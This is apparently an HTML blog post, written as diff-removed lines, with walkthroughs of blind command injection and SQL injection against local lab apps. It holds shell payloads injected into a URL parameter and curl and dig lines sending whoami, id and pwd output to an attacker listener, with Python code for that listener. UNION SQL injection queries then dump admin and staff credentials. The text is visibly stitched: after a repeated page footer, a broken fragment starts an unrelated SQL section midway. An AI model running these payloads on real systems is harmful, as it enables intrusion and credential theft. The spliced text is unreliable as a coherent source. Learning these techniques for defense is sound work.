-http://0.0.0.0:8080/invoice.php?file=invoice1
-</code></pre>
-</div>
-
-<ol>
-  <li>That <code class="language-plaintext highlighter-rouge">file</code> parameter? It’s the weak link. When we start messing with it like running <code class="language-plaintext highlighter-rouge">pwd</code> (print working directory in Linux) the server blindly executes it. Remote Code Execution (RCE).</li>
-</ol>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; pwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JjOPZfh85Lzuj3o_h7E-Ng.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<ol>
-  <li>Next, we try <code class="language-plaintext highlighter-rouge">ls</code> to list directories. The server spits back the contents.</li>
-</ol>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; ls
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dwZAx8GLOe-oEzPqeKBUlg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><strong>What this means:</strong>
-Attackers can slip commands through that parameter, bypassing any security guardrails, and gain full control of your system without breaking a sweat.</p>
-
-<h2 id="detecting-command-injection-from-echoes-to-silence">Detecting Command Injection: From Echoes to Silence</h2>
-
-<p>Detection relies on understanding how the app <em>behaves</em> when fed hostile input. There are two primary categories:</p>
-
-<h3 id="types-of-command-injection">Types of Command Injection</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>Type</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>Verbose</strong></td>
-      <td>You get immediate feedback. Think <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">id</code>, or <code class="language-plaintext highlighter-rouge">uname -a</code> if the output is reflected in the response, the target is talking.</td>
-    </tr>
-    <tr>
-      <td><strong>Blind</strong></td>
-      <td>No output. The system executes commands silently. You need to analyze behavior, timing, or external signals to confirm execution. This is stealth mode.</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<h2 id="detecting-blind-command-injection">Detecting Blind Command Injection</h2>
-
-<p>The hardest to spot. There’s no direct output just subtle shifts in behavior. You’re probing in the dark, waiting for the system to flinch.</p>
-
-<h3 id="1-time-based-payloads">1. <strong>Time-Based Payloads</strong></h3>
-
-<p>Use commands that introduce a delay. Examples:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">ping -c 5 127.0.0.1</code> (Linux)</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">timeout /T 5</code> (Windows)</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">sleep 5</code></p>
-  </li>
-</ul>
-
-<p>If the response time increases proportionally to the command, the target’s bleeding commands under the hood.</p>
-
-<h4 id="2-out-of-band-oob-detection">2. <strong>Out-of-Band (OOB) Detection</strong></h4>
-
-<p>If you control a server (Burp Collaborator, your own webhook, etc.), use payloads like:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-curl http://yourhost.com/$(whoami)
-</code></pre>
-</div>
-
-<p>If your server receives a pingback? Game over. You’ve got code execution.</p>
-
-<h3 id="3-output-redirection">3. <strong>Output Redirection</strong></h3>
-
-<p>Force output to a file:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-whoami &gt; /tmp/output.txt
-</code></pre>
-</div>
-
-<p>Then attempt to read it:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-cat /tmp/output.txt
-</code></pre>
-</div>
-
-<p>This requires multiple steps and possibly multiple injection points, but if you pull it off it’s a solid confirm.</p>
-
-<hr />
-
-<h2 id="the-curl-trick">The Curl Trick</h2>
-
-<p><code class="language-plaintext highlighter-rouge">curl</code> is the Swiss Army knife of testing. Use it to exfil data, confirm execution, or verify external command execution.</p>
-
-<p>Example payload:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-curl http://yourhost.com?data=$(id)
-</code></pre>
-</div>
-
-<p>If you log the inbound request and see the system’s UID info? You just lit up their internals.</p>
-
-<hr />
-
-<h2 id="final-thoughts">Final Thoughts</h2>
-
-<p>Blind command injection is about patience, observation, and precision. You’re not shooting bullets you’re setting traps. Always consider the OS, encoding quirks, filters, and how input is parsed.</p>
-
-<p>In the field? Don’t just fire payloads. Read the system. Observe delays. Monitor DNS logs. Force OOB callbacks.</p>
-
-<h1 id="blind-command-injection-in-action">Blind Command Injection in Action</h1>
-
-<p>Let’s break down a live scenario.</p>
-
-<p>We’re working with a vulnerable endpoint:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>At first glance, it just pulls a template based on the <code class="language-plaintext highlighter-rouge">file</code> parameter.</p>
-
-<hr />
-
-<h4 id="initial-test-verbose-attempt">Initial Test Verbose Attempt</h4>
-
-<p>We try to inject a simple system command:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1;%20pwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0v77pl16YzMQL0mCrGpWFA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>The app responds:</p>
-
-<div class="alert-error">
-[!] Template not found: invoice1; pwd`
-</div>
-
-<p><strong>What this tells us:</strong>
-The input was executed or parsed, but we’re not seeing command output looks like it’s treating everything after <code class="language-plaintext highlighter-rouge">;</code> as part of the filename. So far, no solid confirmation of execution.</p>
-
-<hr />
-
-<h4 id="pivot-to-blind-injection">Pivot to Blind Injection</h4>
-
-<p>Now we go stealth: <strong>time-based testing</strong>.</p>
-
-<p>We craft this payload:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%205
-</code></pre>
-</div>
-
-<p><strong>Result:</strong>
-The page takes ~5 seconds to respond. That’s suspicious.</p>
-
-<p>To confirm, we bump it up:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%2010
-</code></pre>
-</div>
-
-<p><strong>Now it takes 10 seconds.</strong></p>
-
-<p><strong>Bingo.</strong> That delay is our echo in the void. We’re executing commands we’re just blind to the output.</p>
-
-<hr />
-
-<h4 id="visual-proof-gifscreenshot">Visual Proof (GIF/Screenshot)</h4>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_5R3d3TmgaQ4Cp192pe85w.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Visuals here reinforce what’s happening. The delay is tied to our payload. That’s how we <strong>detect blind command injection</strong>  by controlling time, not output.</p>
-
-<h1 id="out-of-band-oob-command-injection-detection">Out-of-Band (OOB) Command Injection Detection</h1>
-<hr />
-
-<p>Blind injection isn’t always about watching timeouts. Sometimes, the system talks <strong>just not to you</strong>. So we make it talk to <strong>us</strong>.</p>
-
-<p>We use <strong>OOB detection</strong> to catch these silent payloads by watching for outbound requests triggered by the app.</p>
-
-<hr />
-
-<h3 id="scenario-setup">Scenario Setup</h3>
-
-<p>Same target:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>We want to test if this endpoint lets us execute system-level commands even if we get no visual output.</p>
-
-<hr />
-
-<h3 id="step-1-set-up-a-listener">Step 1: Set Up a Listener</h3>
-
-<p>We spin up a minimal Python HTTP server to catch any outbound callbacks triggered by tools like <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">wget</code>, or even DNS requests.</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">Python</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-python">
-# oob_listener.py
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import logging
-
-class TrapHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        logging.info(f"OOB GET request: {self.path}")
-        print(f"[+] Caught request from {self.client_address[0]} | PATH: {self.path}")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'ACK')
-
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    server = HTTPServer(('0.0.0.0', 80), TrapHandler)
-    print("[*] Listening for incoming OOB requests on port 80...")
-    server.serve_forever()
-</code></pre>
-</div>
-
-<p><strong>Goal</strong>: Catch any network beacon from the target that hits this listener.</p>
-
-<hr />
-
-<h3 id="step-2-trigger-the-payload">Step 2: Trigger the Payload</h3>
-
-<p>Now that our trap is live, we inject this into the vulnerable URL:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(whoami)
-</code></pre>
-</div>
-
-<p>Or:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(pwd)
-</code></pre>
-</div>
-
-<p><strong>Watch the console</strong> if the app executes our command, it will leak the output (<code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">pwd</code>, etc.) into the URL path and hit our trap server.</p>
-
-<hr />
-
-<h3 id="step-3-confirm-execution">Step 3: Confirm Execution</h3>
-
-<p>Your listener should output something like:</p>
-
-<p><code class="language-plaintext highlighter-rouge">[+] Caught request from 10.0.2.12 | PATH: /root</code></p>
-
-<p>That means your payload got executed, the app reached out to your server, and it returned the result of <code class="language-plaintext highlighter-rouge">$(whoami)</code> or <code class="language-plaintext highlighter-rouge">$(pwd)</code>.</p>
-
-<p><strong>command execution confirmed via OOB</strong>.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OyWoFZy4uaRWq_sMjEghNw.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h3 id="why-this-works">Why This Works</h3>
-
-<p>Most apps don’t restrict outbound traffic. So if you can’t see the result on the frontend, you make the backend deliver the result to your own server. It’s like putting a mic on the enemy comms.</p>
-
-<hr />
-
-<h3 id="pro-tips">Pro Tips</h3>
-
-<ul>
-  <li>
-    <p>Use tools like <strong>Burp Collaborator</strong>, <strong>RequestBin</strong>, or your own <strong>DNS/HTTP listener</strong>.</p>
-  </li>
-  <li>
-    <p>Want stealth? Use DNS-based callbacks: <code class="language-plaintext highlighter-rouge">dig $(whoami).yourdomain.com</code></p>
-  </li>
-  <li>
-    <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
-  </li>
-</ul>
-
-    </section>
-
-    <footer class="mt-8 text-sm text-gray-400">
-      <a href="/posts" class="hover:text-white">← Back to blog</a>
-    </footer>
-  </article>
-</div>
-
-<script>
-function filterPosts(tag) {
-  const posts = document.querySelectorAll('#posts-list li');
-  posts.forEach(post => {
-    const tags = post.getAttribute('data-tags').split(' ');
-    if (tag === 'all' || tags.includes(tag)) {
-      post.style.display = '';
-    } else {
-      post.style.display = 'none';
-    }
-  });
-}
-</script>
-
-    </section>
-
-    <footer class="mt-8 text-sm text-gray-400">
-      <a href="/posts" class="hover:text-white">← Back to blog</a>
-    </footer>
-  </article>
-<p>&lt;/div&gt;t-error”&gt;
-Error: Conversion failed when converting the varchar value ‘Microsoft SQL Server 2019’ to data type int.
-&lt;/div&gt;</p>
-
-<p>You now know the DB engine and version.</p>
-
-<p>Keep chaining errors and use the messages to:</p>
-
-<ul>
-  <li>
-    <p>Discover table names</p>
-  </li>
-  <li>
-    <p>Leak column names</p>
-  </li>
-  <li>
-    <p>Reveal datatypes</p>
-  </li>
-  <li>
-    <p>Map the entire schema</p>
-  </li>
-</ul>
-
-<blockquote>
-  <p><strong>Pro tip:</strong> Use <code class="language-plaintext highlighter-rouge">GROUP BY</code>, <code class="language-plaintext highlighter-rouge">ORDER BY</code>, or broken <code class="language-plaintext highlighter-rouge">CAST()</code>/<code class="language-plaintext highlighter-rouge">CONVERT()</code> to squeeze out leaks.</p>
-</blockquote>
-
-<hr />
-
-<h3 id="2-union-based-sql-injection">2. UNION-Based SQL Injection</h3>
-
-<p>This is your primary data extraction tool. You piggyback off a legit <code class="language-plaintext highlighter-rouge">SELECT</code> and bolt your own query onto it using the <strong><code class="language-plaintext highlighter-rouge">UNION</code></strong> keyword.</p>
-
-<p>But here’s the catch:</p>
-
-<ul>
-  <li>
-    <p>You must match the <strong>column count</strong> of the original query.</p>
-  </li>
-  <li>
-    <p>The <strong>data types</strong> must align.</p>
-  </li>
-</ul>
-
-<p>Let’s walk it.</p>
-
-<p>Original vulnerable query:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQL</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-SELECT title, content FROM articles WHERE id=3;
-</code></pre>
-</div>
-
-<p>First test: Find column count.</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-?id=3 ORDER BY 1-- ✅
-?id=3 ORDER BY 2-- ✅
-?id=3 ORDER BY 3-- ❌ (error)
-</code></pre>
-</div>
-
-<p>Means 2 columns.</p>
-
-<p>Now inject:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-?id=3 UNION SELECT username, password FROM admins--
-</code></pre>
-</div>
-
-<p>Output:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-web">
-Title: admin
-Content: s3cur3p@ssw0rd
-</code></pre>
-</div>
-
-<p>You just leaked creds. Over the front door. In plain sight.</p>
-
-<h1 id="error-based-sql-injection-walkthrough">Error-Based SQL Injection Walkthrough</h1>
-
-<p>We’re looking at a simple blog site vulnerable to <strong>error-based SQL Injection</strong>.</p>
-
-<p>Test URL:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sql">
-http://localhost:8000/index.php?id=1
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FGEO77cP9yRuYocXH9K-Ag.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<h4 id="step-1-identify-the-injection-point">Step 1: Identify the Injection Point</h4>
-
-<p>To confirm an SQLi vulnerability, we need to <em>break the query</em> and look for errors.</p>
-
-<p>Let’s tweak the URL slightly:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-http://localhost:8000/index.php?id=1'
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yYsVgEO9cJCd7ctNDy2qeA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>we get this classic error:</p>
-
-<div class="alert-error">
-Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1... 
-</div>
-
-<p>That error confirms the input is unsanitized and directly injected into an SQL statement. We’re in.</p>
-
-<hr />
-
-<h4 id="step-2-column-count-with-union-injection">Step 2: Column Count with UNION Injection</h4>
-
-<p>To extract data, we’ll use the <code class="language-plaintext highlighter-rouge">UNION SELECT</code> method. But first, we need to figure out <strong>how many columns</strong> the original query returns.</p>
-
-<p>Try:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-http://localhost:8000/index.php?id=1 UNION SELECT 1
-</code></pre>
-</div>
-
-<p>If it throws:</p>
-
-<p><code class="language-plaintext highlighter-rouge">The used SELECT statements have a different number of columns...</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4wPrWy4iunNK3DzOUxpWZw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>…then the number of columns doesn’t match. Keep adding placeholders until it stops erroring:</p>
-
-<p><code class="language-plaintext highlighter-rouge">1 UNION SELECT 1,2
-1 UNION SELECT 1,2,3</code></p>
-
-<p>Once it works, we know the original query returns <strong>3 columns</strong>.</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2Xa6KpQXbNllygPC77_yVA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<hr />
-
-<h4 id="step-3-control-the-output">Step 3: Control the Output</h4>
-
-<p>Right now, the site displays the <em>first</em> row from the results. We want it to show our injected data instead of the real article.</p>
-
-<p>To make the original query return <strong>no results</strong>, change the ID to something invalid, like <code class="language-plaintext highlighter-rouge">0</code>:</p>
-
-<div class="code-block-container">
-  <span class="code-lang-tag">SQLI</span>
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-sqli">
-http://localhost:8000/index.php?id=0 UNION SELECT 1,2,3
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U1Udu5VDeodVns0GFVXjBA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Now we control the output. Time to exfiltrate.</p>
-
-<hr />
-
-<h4 id="step-4-get-the-current-database">Step 4: Get the Current Database</h4>
-
-<p>Let’s see what database we’re in:</p>
-
-<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,database()</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CdaJdtc9zIclISKtVmDzeQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>It returns:</p>
-
-<p><code class="language-plaintext highlighter-rouge">sqli_one</code></p>
-
-<hr />
-
-<h4 id="step-5-list-all-tables-in-the-database">Step 5: List All Tables in the Database</h4>
-
-<p>We’ll use the internal <code class="language-plaintext highlighter-rouge">information_schema</code> database to get table names:</p>
-
-<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(table_name)
-FROM information_schema.tables
-WHERE table_schema = 'sqli_one'</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oFBVqmZ2f_S8dLFsmylD3A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>We get:</p>
-
-<p><code class="language-plaintext highlighter-rouge">article,staff_users</code></p>
-
-<p><code class="language-plaintext highlighter-rouge">staff_users</code> sounds spicy</p>
-
-<hr />
-
-<h4 id="step-6-discover-table-columns">Step 6: Discover Table Columns</h4>
-
-<p>Now let’s get the column names inside <code class="language-plaintext highlighter-rouge">staff_users</code>:</p>
-
-<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(column_name)
-FROM information_schema.columns
-WHERE table_name = 'staff_users'</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mWZNsPiZLLRlEoIVbEYhdw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>Result:</p>
-
-<p><code class="language-plaintext highlighter-rouge">id,username,password</code></p>
-
-<p>Now we’re ready to extract creds.</p>
-
-<hr />
-
-<h4 id="step-7-dump-the-data">Step 7: Dump the Data</h4>
-
-<p>Let’s pull the actual data from <code class="language-plaintext highlighter-rouge">staff_users</code>. To keep it readable, we format the output with a colon and line breaks:</p>
-
-<p><code class="language-plaintext highlighter-rouge">0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;')
-FROM staff_users</code></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*LItM8RdUP1gRaWo0JLmL2A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>We’ve got usernames and hashed passwords on separate lines. Mission success.</p>
-
